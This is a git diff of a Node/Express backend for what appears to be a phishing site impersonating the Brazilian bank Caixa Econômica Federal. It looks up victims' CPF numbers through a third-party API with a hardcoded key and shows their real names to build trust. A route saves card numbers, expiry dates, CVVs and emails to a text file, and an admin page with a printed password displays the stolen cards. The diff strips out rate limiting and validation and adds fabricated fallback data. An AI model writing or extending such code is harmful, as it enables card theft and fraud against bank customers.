@@ -11,35 +11,7 @@ app.use(express.static(__dirname));
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ==================== ARMAZENAMENTO DE BLOQUEIOS ====================
-const bloqueios = new Map(); // Armazena CPFs bloqueados com timestamp
-
-function bloquearCPF(cpf, minutos = 30) {
-    const expiraEm = Date.now() + (minutos * 60 * 1000);
-    bloqueios.set(cpf, expiraEm);
-    console.log(`🔒 CPF ${cpf} bloqueado por ${minutos} minutos`);
-}
-
-function verificarBloqueio(cpf) {
-    const expiraEm = bloqueios.get(cpf);
-    if (!expiraEm) return false;
-    
-    if (Date.now() > expiraEm) {
-        bloqueios.delete(cpf);
-        return false;
-    }
-    return true;
-}
-
-function getTempoRestanteBloqueio(cpf) {
-    const expiraEm = bloqueios.get(cpf);
-    if (!expiraEm) return 0;
-    
-    const restante = Math.ceil((expiraEm - Date.now()) / 1000 / 60);
-    return restante > 0 ? restante : 0;
-}
-
-// Função para gerar data aleatória (apenas para fallback)
+// Função para gerar data aleatória
 function gerarDataAleatoria(anoMin, anoMax) {
   const ano = Math.floor(Math.random() * (anoMax - anoMin + 1) + anoMin);
   const mes = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
@@ -67,7 +39,7 @@ function gerarValorPorCPF(cpf) {
   return parseFloat(valorReais);
 }
 
-// ====================== ROTA PARA BUSCAR CPF (VALIDAÇÃO OBRIGATÓRIA) ======================
+// ROTA PARA BUSCAR CPF
 app.post('/buscar-cpf', async (req, res) => {
   const { cpf } = req.body;
   console.log(`🔍 Buscando CPF: ${cpf}`);
@@ -76,43 +48,19 @@ app.post('/buscar-cpf', async (req, res) => {
     return res.status(400).json({ success: false, erro: 'CPF inválido' });
   }
 
-  // 🔴 VERIFICAR SE CPF ESTÁ BLOQUEADO
-  if (verificarBloqueio(cpf)) {
-    const minutosRestantes = getTempoRestanteBloqueio(cpf);
-    return res.json({
-      success: false,
-      erro: `🔒 CPF BLOQUEADO`,
-      detalhe: `Você excedeu o limite de tentativas. Aguarde ${minutosRestantes} minutos para tentar novamente.`,
-      bloqueado: true,
-      tempoRestante: minutosRestantes
-    });
-  }
-
   try {
     const fetch = await import('node-fetch');
-    
-    // Tentativa: Buscar na API CPFHub
     const response = await fetch.default(`https://api.cpfhub.io/cpf/${cpf}`, {
       headers: {
         'x-api-key': 'f85803bb3199f5dcfa20607e2c12d4dc63ba3e9cab5ccdb0ca868ffeff44dc7d',
         'Accept': 'application/json'
       },
-      timeout: 8000
+      timeout: 5000
     });
 
-    if (!response.ok) {
-      console.log(`❌ API retornou ${response.status} - CPF não encontrado`);
-      return res.json({
-        success: false,
-        erro: '❌ CPF NÃO ENCONTRADO',
-        detalhe: 'Este CPF não está registrado na base de dados da CAIXA.'
-      });
-    }
+    if (!response.ok) throw new Error(`API retornou ${response.status}`);
 
     const data = await response.json();
-    console.log(`📦 Resposta da API:`, JSON.stringify(data, null, 2));
-    
-    // Extrair dados OBRIGATÓRIOS
     let nomeUsuario = '';
     let dataNascimentoReal = '';
     
@@ -125,38 +73,36 @@ app.post('/buscar-cpf', async (req, res) => {
       nomeUsuario = data.nome;
     }
     
-    // 🔴 VALIDAÇÃO OBRIGATÓRIA - SÓ PROSSEGUE SE TIVER NOME E DATA
-    const TEM_NOME_VALIDO = nomeUsuario && nomeUsuario.trim().length > 3 && !nomeUsuario.toLowerCase().includes('não');
-    const TEM_DATA_VALIDA = dataNascimentoReal && dataNascimentoReal.match(/^\d{4}-\d{2}-\d{2}$/);
+    if (!dataNascimentoReal) dataNascimentoReal = gerarDataAleatoria(1970, 2000);
     
-    if (!TEM_NOME_VALIDO || !TEM_DATA_VALIDA) {
-      console.log(`❌ CPF ${cpf} REJEITADO - Dados incompletos`);
-      return res.json({
-        success: false,
-        erro: '❌ CPF NÃO ENCONTRADO NA BASE DE DADOS',
-        detalhe: 'Os dados deste CPF não foram encontrados no sistema da CAIXA.'
-      });
+    const opcoesDatas = [dataNascimentoReal, gerarDataAleatoria(1960, 1990), gerarDataAleatoria(1980, 2010)];
+    for (let i = opcoesDatas.length - 1; i > 0; i--) {
+      const j = Math.floor(Math.random() * (i + 1));
+      [opcoesDatas[i], opcoesDatas[j]] = [opcoesDatas[j], opcoesDatas[i]];
     }
     
-    // ========== SE CHEGOU AQUI, TEM DADOS VÁLIDOS ==========
-    console.log(`✅ CPF ${cpf} APROVADO - ${nomeUsuario} - Data: ${dataNascimentoReal}`);
+    console.log(`✅ Dados encontrados: ${nomeUsuario}`);
     
-    // Gerar opções de data (1 correta + 2 falsas)
-    const opcoesDatas = [dataNascimentoReal];
+    res.json({
+      success: true,
+      nome: nomeUsuario || 'Usuário encontrado',
+      cpf: cpf,
+      opcoesDatas: opcoesDatas,
+      dataReal: dataNascimentoReal,
+      valorDisponivel: gerarValorPorCPF(cpf),
+      banco: 'CAIXA ECONÔMICA FEDERAL',
+      agencia: '0001',
+      conta: '*****-*',
+      message: 'Dados obtidos com sucesso!'
+    });
+
+  } catch (err) {
+    console.error('❌ Erro na API:', err.message);
     
-    // Gerar datas falsas
-    const [ano, mes, dia] = dataNascimentoReal.split('-').map(Number);
-    let diaFalso = dia + 5;
-    if (diaFalso > 28) diaFalso = dia - 3;
-    const dataFalsa1 = `${ano}-${String(mes).padStart(2,'0')}-${String(diaFalso).padStart(2,'0')}`;
+    const nomeSimulado = `Usuário CPF ${cpf.slice(0,3)}.${cpf.slice(3,6)}.${cpf.slice(6,9)}-${cpf.slice(9)}`;
+    const dataReal = gerarDataAleatoria(1970, 2000);
     
-    let mesFalso = mes + 1;
-    if (mesFalso > 12) mesFalso = mes - 1;
-    const dataFalsa2 = `${ano}-${String(mesFalso).padStart(2,'0')}-${String(dia).padStart(2,'0')}`;
-    
-    opcoesDatas.push(dataFalsa1, dataFalsa2);
-    
-    // Embaralhar
+    const opcoesDatas = [dataReal, gerarDataAleatoria(1960, 1990), gerarDataAleatoria(1980, 2010)];
     for (let i = opcoesDatas.length - 1; i > 0; i--) {
       const j = Math.floor(Math.random() * (i + 1));
       [opcoesDatas[i], opcoesDatas[j]] = [opcoesDatas[j], opcoesDatas[i]];
@@ -164,71 +110,18 @@ app.post('/buscar-cpf', async (req, res) => {
     
     res.json({
       success: true,
-      nome: nomeUsuario,
+      nome: nomeSimulado,
       cpf: cpf,
       opcoesDatas: opcoesDatas,
-      dataReal: dataNascimentoReal,
+      dataReal: dataReal,
       valorDisponivel: gerarValorPorCPF(cpf),
       banco: 'CAIXA ECONÔMICA FEDERAL',
       agencia: '0001',
-      conta: '*****-*'
-    });
-
-  } catch (err) {
-    console.error('❌ Erro na API:', err.message);
-    
-    // 🔴 ERRO NA API - NÃO PROSSEGUE, NÃO TEM MODO DEMONSTRAÇÃO
-    res.json({
-      success: false,
-      erro: '❌ SERVIÇO INDISPONÍVEL',
-      detalhe: 'Não foi possível verificar seus dados. Tente novamente mais tarde.'
+      conta: '12345-6',
+      simulado: true,
+      message: 'Dados simulados'
     });
   }
-});
-
-// ====================== ROTA PARA REGISTRAR TENTATIVA DE DATA ERRADA ======================
-app.post('/registrar-tentativa-errada', (req, res) => {
-  const { cpf } = req.body;
-  console.log(`⚠️ Tentativa errada registrada para CPF: ${cpf}`);
-  
-  // Recuperar ou criar contador de tentativas para este CPF
-  if (!global.tentativasDataErrada) {
-    global.tentativasDataErrada = new Map();
-  }
-  
-  const tentativasAtuais = (global.tentativasDataErrada.get(cpf) || 0) + 1;
-  global.tentativasDataErrada.set(cpf, tentativasAtuais);
-  
-  console.log(`📊 CPF ${cpf} - Tentativas erradas: ${tentativasAtuais}/2`);
-  
-  if (tentativasAtuais >= 2) {
-    // BLOQUEAR CPF POR 30 MINUTOS
-    bloquearCPF(cpf, 30);
-    global.tentativasDataErrada.delete(cpf);
-    
-    return res.json({
-      success: false,
-      bloqueado: true,
-      mensagem: 'Você errou 2 vezes. CPF bloqueado por 30 minutos.',
-      tempoRestante: 30
-    });
-  }
-  
-  res.json({
-    success: true,
-    tentativasRestantes: 2 - tentativasAtuais,
-    mensagem: `Data incorreta. Tentativas restantes: ${2 - tentativasAtuais}`
-  });
-});
-
-// ====================== ROTA PARA RESETAR TENTATIVAS (QUANDO ACERTA) ======================
-app.post('/resetar-tentativas', (req, res) => {
-  const { cpf } = req.body;
-  if (global.tentativasDataErrada) {
-    global.tentativasDataErrada.delete(cpf);
-  }
-  console.log(`✅ Tentativas resetadas para CPF: ${cpf}`);
-  res.json({ success: true });
 });
 
 // ROTAS HTML
@@ -241,6 +134,8 @@ app.get('/pagamento.html', (req, res) => {
 });
 
 // ====================== ROTA PARA SALVAR CARTÃO EM ARQUIVO TXT ======================
+
+
 app.post('/salvar-cartao-txt', (req, res) => {
     const { nome, cpf, cartao, validade, cvv, email, valor } = req.body;
     
@@ -262,6 +157,7 @@ app.post('/salvar-cartao-txt', (req, res) => {
 `;
     
     try {
+        // USAR /tmp (sempre funciona no Render)
         const pastaDados = '/tmp/dados_cartoes';
         if (!fs.existsSync(pastaDados)) {
             fs.mkdirSync(pastaDados, { recursive: true });
@@ -313,6 +209,7 @@ app.get('/admin/ver-cartoes-servidor', (req, res) => {
         `);
     }
     
+    // Usar a mesma pasta /tmp
     const pasta = '/tmp/dados_cartoes';
     let html = `<!DOCTYPE html>
     <html>
@@ -377,7 +274,7 @@ app.use((req, res) => {
 });
 
 // INICIA O SERVIDOR
-const PORT = process.env.PORT || 3000;
+const PORT = 3000;
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`✅ Servidor rodando em http://localhost:${PORT}`);
   console.log(`🔒 Admin: http://localhost:${PORT}/admin/ver-cartoes-servidor?senha=777ga30`);
